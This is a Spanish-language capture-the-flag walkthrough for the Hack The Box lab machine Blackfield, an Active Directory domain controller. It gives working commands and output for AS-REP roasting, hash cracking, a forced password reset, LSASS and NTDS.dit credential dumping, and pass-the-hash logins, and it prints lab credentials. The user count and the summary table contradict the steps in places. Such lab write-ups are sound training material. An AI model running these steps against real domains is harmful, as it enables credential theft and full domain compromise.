# HTB Blackfield — Walkthrough Completo en Español

**IP Objetivo**: 10.10.10.192 (entorno HTB)  
**Dificultad**: Hard  
**Sistema**: Windows Active Directory (Controlador de Dominio DC01)  
**Dominio**: BLACKFIELD.local  

> Esta guía integra los pasos de varios writeups públicos, con los comandos clave y fragmentos de salida esperados. Está pensada para reproducirse en Kali Linux de principio a fin.


## 1. Reconocimiento

### 1.1 Escaneo de puertos

Primero un escaneo rápido para ver qué está abierto:

```bash
rustscan -a 10.10.10.192 --ulimit 5000
```

Salida de ejemplo:
```
Open 10.10.10.192:53
Open 10.10.10.192:88
Open 10.10.10.192:135
Open 10.10.10.192:389
Open 10.10.10.192:445
Open 10.10.10.192:593
Open 10.10.10.192:3268
Open 10.10.10.192:5985
```

Luego un escaneo más profundo con versiones y scripts por defecto:

```bash
nmap -sC -sV -p 53,88,135,389,445,593,3268,5985 -Pn 10.10.10.192 -oA nmap_blackfield
```

Salida clave:
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local)
445/tcp  open  microsoft-ds  SMB
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Host: DC01, Domain: BLACKFIELD.local
```

**Conclusión**: es un controlador de dominio. La combinación de puertos (53+88+389+445+5985) es la firma típica de un DC.


## 2. Enumeración SMB anónima → Lista de usuarios

### 2.1 Comprobar acceso anónimo / guest

```bash
smbmap -u guest -H 10.10.10.192
```

O con `netexec` (antes CrackMapExec):

```bash
nxc smb 10.10.10.192 -u 'Guest' -p '' --shares
```

La salida muestra un recurso compartido legible:
```
Share         Permissions
-----         -----------
profiles$     READ
forensic      (sin permiso)
IPC$          READ
```

`profiles$` se puede leer de forma anónima; `forensic` todavía no.

### 2.2 Enumerar profiles$ para obtener usuarios

```bash
smbclient //10.10.10.192/profiles$ -N -c 'ls' > profiles_raw.txt
```

La salida contiene muchas carpetas con nombres de personas:
```
AAlleni    D  0  Wed Jun  3 16:47:11 2020
ABarteski  D  0  ...
...
support    D  0  ...
audit2020  D  0  ...
```

Extraemos los nombres de usuario:

```bash
cat profiles_raw.txt | awk '{print $1}' > users.txt
```

### 2.3 Validar usuarios reales (Kerbrute)

La mayoría de los nombres en `profiles$` son señuelos. Usamos `kerbrute` para ver cuáles existen realmente:

```bash
kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.txt -t 50
```

Salida con los usuarios válidos:
```
[+] VALID USERNAME: support@BLACKFIELD.LOCAL
[+] VALID USERNAME: audit2020@BLACKFIELD.LOCAL
```

En realidad solo hay 3 usuarios válidos. `support` es la primera entrada clave.


## 3. AS-REP Roasting → Credenciales de support

### 3.1 Lanzar AS-REP Roasting

Contra la lista de usuarios:

```bash
impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -dc-ip 10.10.10.192 -format hashcat -outputfile asrep_hashes.txt
```

Se captura el hash AS-REP del usuario `support`:
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:...
```

### 3.2 Crackear el hash

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Resultado:
```
support : #00^BlackKnight
```

**Credenciales actuales**: `BLACKFIELD\support` / `#00^BlackKnight`.


## 4. Análisis con BloodHound → ForceChangePassword

### 4.1 Recolectar datos para BloodHound

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.10.10.192 -c DcOnly
```

### 4.2 Importar y analizar

Importamos los JSON generados en BloodHound y consultamos los permisos salientes de `support`:

**Hallazgo**: `support` tiene **ForceChangePassword** sobre el usuario `audit2020`.


## 5. Resetear la contraseña de audit2020 → Acceder al recurso forensic

### 5.1 Resetear la contraseña con rpcclient

```bash
rpcclient -U 'BLACKFIELD.local/support%#00^BlackKnight' 10.10.10.192
```

Dentro de la sesión interactiva:

```
rpcclient $> setuserinfo2 audit2020 23 'P@ssw0rd123!'
```

O con `net rpc` (más limpio):

```bash
net rpc password "audit2020" "P@ssw0rd123!" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S 10.10.10.192
```

Verificamos que funcionó:

```bash
nxc smb 10.10.10.192 -u audit2020 -p 'P@ssw0rd123!' --shares
```

Ahora `forensic` es legible.


## 6. Volcado de LSASS → Hash de svc_backup

### 6.1 Descargar el contenido de forensic

```bash
smbclient //10.10.10.192/forensic -U 'BLACKFIELD.local/audit2020%P@ssw0rd123!'
```

Dentro:

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Nos interesa especialmente `memory_analysis/lsass.zip`.

### 6.2 Descomprimir y analizar el volcado de LSASS

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

En la salida extraemos el hash NTLM de `svc_backup`:
```
== WDIGEST [633ba]==
username svc_backup
domainname BLACKFIELD
NT: 9658d1d1dcd9250115e2205d9f48400d
```

**Credenciales actuales**: hash NTLM de `BLACKFIELD\svc_backup`.


## 7. Login por WinRM → user.txt

### 7.1 Evil-WinRM con Pass-the-Hash

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

### 7.2 Obtener la flag de usuario

```powershell
type C:\Users\svc_backup\Desktop\user.txt
```


## 8. Escalada de privilegios: SeBackupPrivilege → Volcar NTDS.dit

### 8.1 Confirmar privilegios

```powershell
whoami /priv
```

Salida clave:
```
SeBackupPrivilege    Back up files and directories    Enabled
SeRestorePrivilege   Restore files and directories    Enabled
```

`svc_backup` pertenece al grupo **Backup Operators**, que tiene `SeBackupPrivilege`.

### 8.2 Crear una copia de sombra con diskshadow

Como `ntds.dit` está en uso por el sistema, hay que exportarlo vía VSS.

**Paso 1**: en Kali creamos el script `diskshadow.txt`:

```
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
```

**Paso 2**: convertir formato y subirlo:

```bash
unix2dos diskshadow.txt
```

En la sesión de Evil-WinRM:

```powershell
upload diskshadow.txt
```

**Paso 3**: ejecutar diskshadow:

```powershell
diskshadow /s diskshadow.txt
```

**Paso 4**: copiar ntds.dit y el hive SYSTEM:

```powershell
robocopy /b z:\Windows\NTDS\ . ntds.dit
reg save hklm\system system.hive
```

### 8.3 Descargar los archivos a Kali

```bash
# En Evil-WinRM
download ntds.dit
download system.hive
```

### 8.4 Extraer todos los hashes offline

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

En la salida obtenemos el hash NTLM del **Administrator**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7f44d4dcdc4a5a4f8d9e0d6c1c2b8e4f:::
```


## 9. Obtener root.txt

### 9.1 Iniciar sesión con el hash del Administrator

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H <Hash_Administrator>
```

O con `psexec.py`:

```bash
impacket-psexec -hashes <LM>:<NT> Administrator@10.10.10.192
```

### 9.2 Leer la flag de root

```powershell
type C:\Users\Administrator\Desktop\root.txt
```


## Resumen de la cadena de ataque

| Fase | Técnica | Credenciales clave |
|------|---------|-------------------|
| Acceso inicial | AS-REP Roasting | `support:#00^BlackKnight` |
| Movimiento lateral 1 | ForceChangePassword (ACL) | Reset de contraseña de `audit2020` |
| Movimiento lateral 2 | Volcado de memoria LSASS | Hash NTLM de `svc_backup` |
| Escalada de privilegios | SeBackupPrivilege + VSS | Volcado de NTDS.dit |
| Toma del DC | DCSync / Pass-the-Hash | Hash de Administrator |

---

**Nota**: los comandos anteriores funcionan en el entorno de HTB. Ajusta IPs y contraseñas según tu instancia. Te recomiendo ir tomando notas y guardando la salida de cada paso para repasar después.